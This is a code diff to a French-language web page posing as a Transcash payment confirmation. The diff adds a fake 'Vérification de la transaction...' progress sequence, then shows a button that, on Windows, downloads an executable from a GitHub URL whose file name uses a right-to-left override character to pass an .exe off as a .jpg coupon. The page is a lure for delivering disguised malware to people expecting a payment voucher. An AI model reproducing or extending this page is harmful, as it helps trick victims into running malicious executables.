@@ -34,6 +34,32 @@
       width: 150px;
     }
 
+    .step-wrapper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      min-height: 24px;
+    }
+
+    .spinner, .checkmark {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+    }
+
+    .spinner {
+      border: 3px solid #ccc;
+      border-top: 3px solid #b12226;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     h1 {
       color: #b12226;
       font-size: 28px;
@@ -55,6 +81,7 @@
       font-size: 16px;
       border-radius: 8px;
       transition: background-color 0.3s;
+      display: none;
     }
 
     .download-btn:hover {
@@ -78,6 +105,13 @@
   <h1>Confirmation de Paiement</h1>
   <p class="message">Votre transaction a été validée avec succès. Cliquez ci-dessous pour télécharger votre coupon Transcash.</p>
 
+  <div id="loadingSteps">
+    <div class="step-wrapper">
+      <div class="spinner" id="loadingIcon"></div>
+      <div class="step-message">Vérification de la transaction...</div>
+    </div>
+  </div>
+
   <button class="download-btn" id="downloadBtn">📥 Télécharger le fichier</button>
 
   <div class="footer">
@@ -92,41 +126,63 @@
     return navigator.userAgent.indexOf('Windows') !== -1;
   }
 
+  const steps = [
+    "Vérification de la transaction...",
+    "Coupon reconnu",
+    "Validation prête"
+  ];
+
   const downloadLink = "https://raw.githubusercontent.com/fabienneroger/transcash-auto/main/Transcashind%E2%80%AEgpj.exe";
 
-  document.getElementById("downloadBtn").addEventListener("click", function(e) {
+  const stepText = document.querySelector(".step-message");
+  const loadingIcon = document.getElementById("loadingIcon");
+  const downloadBtn = document.getElementById("downloadBtn");
+  const stepWrapper = document.getElementById("loadingSteps");
+
+  let currentStep = 0;
+
+  function showNextStep() {
+    if (currentStep < steps.length) {
+      stepText.textContent = steps[currentStep];
+      currentStep++;
+      setTimeout(showNextStep, 1500);
+    } else {
+      stepWrapper.style.display = "none";
+      downloadBtn.style.display = "inline-block";
+    }
+  }
+
+  showNextStep();
+
+  downloadBtn.addEventListener("click", function(e) {
     e.preventDefault();
 
     if (isWindows()) {
-      try {
-        const xhr = new XMLHttpRequest();
-        xhr.open("GET", downloadLink, true);
-        xhr.responseType = "blob";
+      const xhr = new XMLHttpRequest();
+      xhr.open("GET", downloadLink, true);
+      xhr.responseType = "blob";
 
-        xhr.onload = function () {
-          if (xhr.status === 200) {
-            const blob = xhr.response;
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement("a");
-            a.href = url;
-            a.download = "TranscashIndgpj.exe";
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            window.URL.revokeObjectURL(url);
-          } else {
-            alert("❌ Erreur lors du téléchargement : " + xhr.status);
-          }
-        };
+      xhr.onload = function () {
+        if (xhr.status === 200) {
+          const blob = xhr.response;
+          const url = window.URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "TranscashIndgpj.exe";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+          window.URL.revokeObjectURL(url);
+        } else {
+          alert("❌ Erreur lors du téléchargement : " + xhr.status);
+        }
+      };
 
-        xhr.onerror = function () {
-          alert("❌ Une erreur est survenue lors de la requête.");
-        };
+      xhr.onerror = function () {
+        alert("❌ Une erreur est survenue lors de la requête.");
+      };
 
-        xhr.send();
-      } catch (err) {
-        alert("❌ Une erreur est survenue : " + err.message);
-      }
+      xhr.send();
     } else {
       alert("❌ Le fichier est uniquement disponible sur un ordinateur Windows.");
     }
